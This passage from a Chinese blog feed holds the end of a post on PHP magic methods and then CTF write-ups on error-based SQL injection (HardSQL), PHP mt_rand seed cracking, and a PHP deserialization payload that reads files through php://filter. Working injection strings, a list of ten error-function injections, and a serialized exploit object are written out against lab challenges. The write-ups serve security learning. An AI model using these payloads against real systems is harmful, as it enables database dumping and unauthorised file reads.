class="code"><pre><span class="line">这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。</span><br></pre></td></tr></table></figure><p>扩展：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实php发展到今天，已经有将 `spl_autoload_register` — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。</span><br></pre></td></tr></table></figure><h3 id="debugInfo-，打印所需调试信息"><a href="#debugInfo-，打印所需调试信息" class="headerlink" title="__debugInfo()，打印所需调试信息"></a>__debugInfo()，打印所需调试信息</h3><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prop = $val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'propSquared'</span> =&gt; <span class="keyword">$this</span>-&gt;prop ** <span class="number">2</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="keyword">new</span> C(<span class="number">42</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(C)#1 (1) &#123; [&quot;propSquared&quot;]=&gt; int(1764) &#125;</span><br></pre></td></tr></table></figure><p>再次注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的 `**` 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是PHP中我了解到的魔术方法了，常用的包括 <code>__set()</code> <code>__get()</code> <code>__autoload</code>() 等应该熟悉，其他的了解也没有关系，毕竟知识不怕多嘛。</p><p>好了，有兴趣的或者我这里没有说明白的，可以参考啊官方文档。</p><p><a href="http://php.net/manual/zh/" target="_blank" rel="noopener">PHP在线手册地址</a></p><p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title> [极客大挑战 2019]HardSQL</title>
    <link href="http://goudanjun.vip/2021/01/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL.html/"/>
    <id>http://goudanjun.vip/2021/01/17/极客大挑战-2019-HardSQL.html/</id>
    <published>2021-01-17T12:23:22.000Z</published>
    <updated>2021-01-17T13:01:57.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>考点：报错注入</p><a id="more"></a><p>XPATH报错；过滤了空格，等号，and</p><p>爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># geek</span></span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># H4rDsq1</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;731351f9-6bb1-4cef-acb7-1c</span></span><br></pre></td></tr></table></figure><p>由于只有一半 所以我们用 left()和right() 函数来爆后面的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9-6bb1-4cef-acb7-1ceb55c45a02&#125;</span></span><br></pre></td></tr></table></figure><p>最后得到flag：flag{731351f9-6bb1-4cef-acb7-1ceb55c45a02}</p><p>注：“^” 在 sql 语句中是异或的作用也可以换成 or；由于过滤了空格可以使用()绕过；过滤了“=”可以使用 like 绕过；由于是 XPATH 报错我们可以使用 extractvalue()或者updatexml()报错注入</p><h2 id="十种报错函数"><a href="#十种报错函数" class="headerlink" title="十种报错函数"></a>十种报错函数</h2><p>1.floor()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/OJdbi2PIDCGuUYq.png" alt="1016026-20160928204840594-1429421338"></p><p>2.extractvalue()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/JHdtuBIy72gipjn.png" alt="1016026-20160928205421297-407989251"></p><p>3.updatexml()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/zA2VyeRTUQHEiIO.png" alt="1016026-20160928205451969-1920882857"></p><p>4.geometrycollection()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/fpcINsh9ZyKXgVP.png" alt="1016026-20160928205719485-521701933"></p><p>5.multipoint()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/MXgDKYI4SNCoLiT.png" alt="1016026-20160928205942266-563740245"></p><p>6.polygon()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/lCxvQr1HV42pOF8.png" alt="1016026-20160928205828281-760176387"></p><p>7.multipolygon()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/ypix3XkH1Nc7Gwm.png" alt="1016026-20160928210038094-1420034123"></p><p>8.linestring()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/l8H3vJfcneDSCRw.png" alt="1016026-20160928210144438-1099086559"></p><p>9.multilinestring()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/5j1tVEkunLWd8gA.png" alt="1016026-20160928210420750-344279412"></p><p>10.exp()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/U6LYBpoODh7ISrk.png" alt="1016026-20160928210533313-2028104812"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;极客大挑战-2019-HardSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-HardSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]HardSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]HardSQL&lt;/h1&gt;&lt;p&gt;考点：报错注入&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="SQL注入" scheme="http://goudanjun.vip/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="报错注入" scheme="http://goudanjun.vip/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>[GWCTF 2019]枯燥的抽奖</title>
    <link href="http://goudanjun.vip/2021/01/17/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96.html/"/>
    <id>http://goudanjun.vip/2021/01/17/GWCTF-2019-枯燥的抽奖.html/</id>
    <published>2021-01-17T12:23:07.000Z</published>
    <updated>2021-01-17T13:02:15.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>考点：php伪随机数</p><a id="more"></a><p>check.php中有 mt_srand()和mt_rand()两个伪随机函数</p><p><img src="https://i.loli.net/2021/01/13/WwCku1RMVsdAPI8.png" alt="image-20210113181832863"></p><p>这里用到了php伪随机的种子爆破，利用网上的c语言脚本：<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p><p>逆向题目中的加密函数，使符合脚本的输入规范</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'A5rgiREesS'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/x8DmpyH452TlakC.png" alt="微信截图_20210113184021"></p><p>用脚本爆破种子</p><p><img src="https://i.loli.net/2021/01/14/Kuwxg1ofsTdV9WI.png" alt="QQ截图20210113184233"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span><br><span class="line"><span class="comment">#961723226</span></span><br></pre></td></tr></table></figure><p>将种子代入原函数得到字符串</p><p><img src="https://i.loli.net/2021/01/13/3DYUHOhNkdM862W.png" alt="QQ截图20210113184329"></p><p>php_my_seed使用方法：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></li><li><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;GWCTF-2019-枯燥的抽奖&quot;&gt;&lt;a href=&quot;#GWCTF-2019-枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]枯燥的抽奖&quot;&gt;&lt;/a&gt;[GWCTF 2019]枯燥的抽奖&lt;/h1&gt;&lt;p&gt;考点：php伪随机数&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="伪随机数" scheme="http://goudanjun.vip/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>[网鼎杯 2020 青龙组] AreUSerialz</title>
    <link href="http://goudanjun.vip/2021/01/17/%C2%96-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz.html/"/>
    <id>http://goudanjun.vip/2021/01/17/-网鼎杯-2020-青龙组-AreUSerialz.html/</id>
    <published>2021-01-17T12:22:49.000Z</published>
    <updated>2021-01-17T13:01:49.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组] AreUSerialz"></a>[网鼎杯 2020 青龙组] AreUSerialz</h1><p>借这道题复习记录下反序列化的小细节~</p><a id="more"></a><p>首先源码审计，这里就不贴源码了，直接看可控参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $op;</span><br><span class="line"><span class="keyword">protected</span> $filename;</span><br><span class="line"><span class="keyword">protected</span> $content;</span><br></pre></td></tr></table></figure><p>op为操作标识，op=1时写文件，op=2时读文件；filename 标识读取文件的名字；content 是写文件时写入的内容</p><p>看源代码中的魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)<span class="comment">//强类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中反序列化时不会调用 构造函数，所以我们将注意力放在析构函数中，注意到析构函数中有一个强类型比较</p><p>而在 process()函数中 是弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;<span class="comment">//弱类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们使 op=2 ，在析构函数中强类型比较为 false，而在process()中弱类型比较为 true</p><p>之后在read函数中，我们的可控变量为filename，利用php伪协议进行读取文件操作 ：php://filter/read=convert.base64-encode/resource=flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里我们就可以构造payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment"># O:11:"FileHandler":3:&#123;s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:"%00*%00content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里注意 protected 属性的变量在序列化时 变量名前需要加”%00*%00“</p><p>在这道题中%00的ascii码为0 会被is_valid()函数拦截，这里绕过的话可以利用php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctf中的php反序列化可参考以下链接</p><ul><li><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></li><li><a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></li><li><a href="https://www.cnblogs.com/Xy--1/p/12649865.html" target="_blank" rel="noopener">https://www.cnblogs.com/Xy--1/p/12649865.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;网鼎杯-2020-青龙组-AreUSerialz&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-青龙组-AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 青龙组] AreUSerialz&quot;&gt;&lt;/a&gt;[网鼎杯 2020 青龙组] AreUSerialz&lt;/h1&gt;&lt;p&gt;借这道题复习记录下反序列化的小细节~&lt;/p&gt;
    
    </summary>
    
    
      <category term="反序列化" scheme="http://goudanjun.vip/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[RoarCTF 2019]Easy Calc</title>
    <link href="http://goudanjun.vip/2021/01/17/%C2%96-RoarCTF-2019-Easy-Calc.html/"/>
    <id>http://goudanjun.vip/2021/01/17/-RoarCTF-2019-Easy-Calc.html/</id>
    <published>2021-01-17T12:22:30.000Z</published>
    <updated>2021-01-17T13:01:53.070Z</updated>
    
